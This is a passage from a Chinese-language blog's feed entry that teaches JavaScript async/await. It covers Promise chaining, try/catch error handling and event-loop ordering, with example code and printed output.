class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(success));</span><br></pre></td></tr></table></figure><p>这里本可以用箭头函数写方便点，但是为了便于阅读本质，还是换成了ES5写法，上面执行函数内所有的await函数才会返回状态，结果是执行完毕3秒后才会弹出’<code>完成</code>‘。</p><p><strong>正常情况下，await 命令后面跟着的是 Promise ，如果不是的话，也会被转换成一个 立即 resolve 的 Promise。</strong></p><p>也可以这么写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeout</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">                    <span class="keyword">return</span> resolve(time + <span class="number">200</span>)</span><br><span class="line">               &#125;,time);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">first</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;第一次延迟了&#x27;</span> + time );</span><br><span class="line">    <span class="keyword">return</span> timeout(time);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">second</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;第二次延迟了&#x27;</span> + time );</span><br><span class="line">    <span class="keyword">return</span> timeout(time);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">third</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;第三次延迟了&#x27;</span> + time );</span><br><span class="line">    <span class="keyword">return</span> timeout(time);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;START&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> time1 = <span class="number">500</span>;</span><br><span class="line">    first(time1).then(<span class="function"><span class="params">time2</span> =&gt;</span> second(time2) )</span><br><span class="line">                .then(<span class="function"><span class="params">time3</span> =&gt;</span> third(time3)  )</span><br><span class="line">                .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">                              <span class="built_in">console</span>.log(<span class="string">&#x27;最后一次延迟&#x27;</span> + res );</span><br><span class="line">                              <span class="built_in">console</span>.timeEnd(<span class="string">&#x27;END&#x27;</span>);</span><br><span class="line">                             &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">start();</span><br></pre></td></tr></table></figure><p>这样用then链式回调的方式执行resolve</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//打印结果</span></span><br><span class="line"></span><br><span class="line">START</span><br><span class="line">第一次延迟了<span class="number">500</span></span><br><span class="line">第二次延迟了<span class="number">700</span></span><br><span class="line">第三次延迟了<span class="number">900</span></span><br><span class="line">最后一次延迟<span class="number">1100</span></span><br><span class="line">END</span><br></pre></td></tr></table></figure><p>用async/await呢？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;START&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> time1 = <span class="number">500</span>;</span><br><span class="line">    <span class="keyword">const</span> time2 = <span class="keyword">await</span> first(time1);</span><br><span class="line">    <span class="keyword">const</span> time3 = <span class="keyword">await</span> second(time2);</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> third(time3);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`最后一次延迟<span class="subst">$&#123;res&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;END&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">start();</span><br></pre></td></tr></table></figure><p>达到了相同的效果。但是这样遇到一个问题，如果<code>await</code>执行遇到报错呢</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;START&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> time1 = <span class="number">500</span>;</span><br><span class="line">    <span class="keyword">const</span> time2 = <span class="keyword">await</span> first(time1);</span><br><span class="line">    <span class="keyword">const</span> time3 = <span class="keyword">await</span> <span class="built_in">Promise</span>.reject(time2);</span><br><span class="line">    <span class="keyword">const</span> res = <span class="keyword">await</span> third(time3);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`最后一次延迟<span class="subst">$&#123;res&#125;</span>`</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;END&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">start();</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/91056032f6264960979d37cd1a70bb47.png" alt="在这里插入图片描述"></p><p>返回reject后，后面的代码都没有执行了，以此迁出一个例子:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> last;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">throwError</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">await</span> <span class="built_in">Promise</span>.reject(<span class="string">&#x27;error&#x27;</span>);    </span><br><span class="line">    last = <span class="keyword">await</span> <span class="string">&#x27;没有执行&#x27;</span>; </span><br><span class="line">&#125;</span><br><span class="line">throwError().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, last))</span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>,last))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/515f365c6a6b42a8ba28f09ee5ef9e78.png" alt="在这里插入图片描述"></p><p>其实<code>async</code>函数不难，难在错处理上。</p><p>上面函数，执行的到<code>await</code>排除一个错误后，就停止往下执行，导致<code>last</code>没有赋值报错。</p><p><code>async</code>里如果有多个await函数的时候，如果其中任一一个抛出异常或者报错了，都会导致函数停止执行，直接<code>reject</code>;</p><p>怎么处理呢，可以用<code>try/catch</code>，遇到函数的时候，可以将错误抛出，并且继续往下执行。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> last;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">throwError</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">try</span>&#123;  </span><br><span class="line">       <span class="keyword">await</span> <span class="built_in">Promise</span>.reject(<span class="string">&#x27;error&#x27;</span>);    </span><br><span class="line">       last = <span class="keyword">await</span> <span class="string">&#x27;没有执行&#x27;</span>; </span><br><span class="line">    &#125;<span class="keyword">catch</span>(error)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;has Error stop&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">throwError().then(<span class="function"><span class="params">success</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;成功&#x27;</span>, last))</span><br><span class="line">            .catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">&#x27;失败&#x27;</span>,last))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8970ccb9b4104f8a83231bf1e92f881a.png" alt="在这里插入图片描述"></p><p>这样的话，就可以继续往下执行了。</p><p>来个🌰练习下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testSometing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testSomething&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;return testSomething&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testAsync</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testAsync&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(<span class="string">&quot;hello async&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;test start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> testFn1 = <span class="keyword">await</span> testSometing();</span><br><span class="line">    <span class="built_in">console</span>.log(testFn1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> testFn2 = <span class="keyword">await</span> testAsync();</span><br><span class="line">    <span class="built_in">console</span>.log(testFn2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test end...&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> promiseFn = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123; </span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;promise START...&quot;</span>);</span><br><span class="line">                    resolve(<span class="string">&quot;promise RESOLVE&quot;</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">promiseFn.then(<span class="function">(<span class="params">val</span>)=&gt;</span> <span class="built_in">console</span>.log(val));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;===END===&quot;</span>)</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://img-blog.csdnimg.cn/a26527124b37419b93418c2a779f2086.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0Fpb2xpbXA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>我们一步步来解析</p><p>首先<code>test()</code>打印出<code>test start...</code></p><p>然后 <code>testFn1 = await testSomething();</code> 的时候，会先执行<code>testSometing()</code>这个函数打印出“<code>testSometing</code>”的字符串。</p><p><code>testAsync()</code>执行完毕返回<code>resolve</code>，之后<code>await</code>会让出线程就会去执行后面的，触发<code>promiseFn</code>打印出“<code>promise START...</code>”。</p><p>接下来会把返回的Promise<code>resolve(&quot;promise RESOLVE&quot;)</code>放入Promise队列（Promise的Job Queue），继续执行打印“<code>===END===</code>”。</p><p>等本轮事件循环执行结束后，又会跳回到<code>async</code>函数中（<code>test()</code>函数），等待之前<code>await</code> 后面表达式的返回值，因为<code>testSometing()</code> 不是<code>async</code>函数，所以返回的是一个字符串“<code>return``testSometing</code>”。</p><p><code>test()</code>函数继续执行，执行到<code>testFn2()</code>，再次跳出<code>test()</code>函数，打印出“<code>testAsync</code>”，此时事件循环就到了Promise的队列，执行<code>promiseFn.then((val)=&gt; console.log(val));</code>打印出“<code>promise RESOLVE</code>”。</p><p>之后和前面一样 又跳回到test函数继续执行<code>console.log(testFn2)</code>的返回值，打印出“<code>hello async</code>”。</p><p>最后打印“<code>test end...</code>”。</p><p>加点料，让<code>testSomething()</code>变成<code>async</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testSometing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testSomething&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;return testSomething&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testAsync</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testAsync&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Promise</span>.resolve(<span class="string">&quot;hello async&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;test start...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> testFn1 = <span class="keyword">await</span> testSometing();</span><br><span class="line">    <span class="built_in">console</span>.log(testFn1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> testFn2 = <span class="keyword">await</span> testAsync();</span><br><span class="line">    <span class="built_in">console</span>.log(testFn2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;test end...&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> promiseFn = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>)=&gt;</span> &#123; </span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">&quot;promise START...&quot;</span>);</span><br><span class="line">                    resolve(<span class="string">&quot;promise RESOLVE&quot;</span>);</span><br><span class="line">                &#125;);</span><br><span class="line">promiseFn.then(<span class="function">(<span class="params">val</span>)=&gt;</span> <span class="built_in">console</span>.log(val));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;===END===&quot;</span>)</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://img-blog.csdnimg.cn/db992cafdc8841f8a445ed5309d81f84.png" alt="在这里插入图片描述"></p><p>和上一个例子比较发现<code>promiseFn.then((val)=&gt; console.log(val)); </code>先于<code>console.log(testFn1)</code> 执行。</p><p>原因是因为现在的版本async函数会被await resolve，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testSometing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testSomething&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;return testSomething&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(testSometing)) <span class="comment">// [object Function]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(testSometing())) <span class="comment">// [object String]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testSometing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;testSomething&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;return testSomething&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(testSometing)) <span class="comment">// [object AsyncFunction]</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.prototype.toString.call(testSometing())) <span class="comment">// [object Promise]</span></span><br></pre></td></tr></table></figure><p><code>testSomething()</code>已经是async函数，返回的是一个Promise对象需要等它 resolve 后将当前Promise 推入队列，随后先清空调用栈，所以会”跳出” test() 函数执行后续代码，随后才开始执行该 Promise。</p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://link.juejin.cn/?target=https://segmentfault.com/a/1190000007535316">理解 JavaScript 的 async/await</a></p><p><a href="https://juejin.cn/post/6844903621360943118#heading-0">一次性让你懂async/await，解决回调地狱</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/categories/JavaScript/"/>
    
    
    <category term="JavaScript" scheme="http://aiolimp.com/tags/JavaScript/"/>
    
  </entry>
  
</feed>
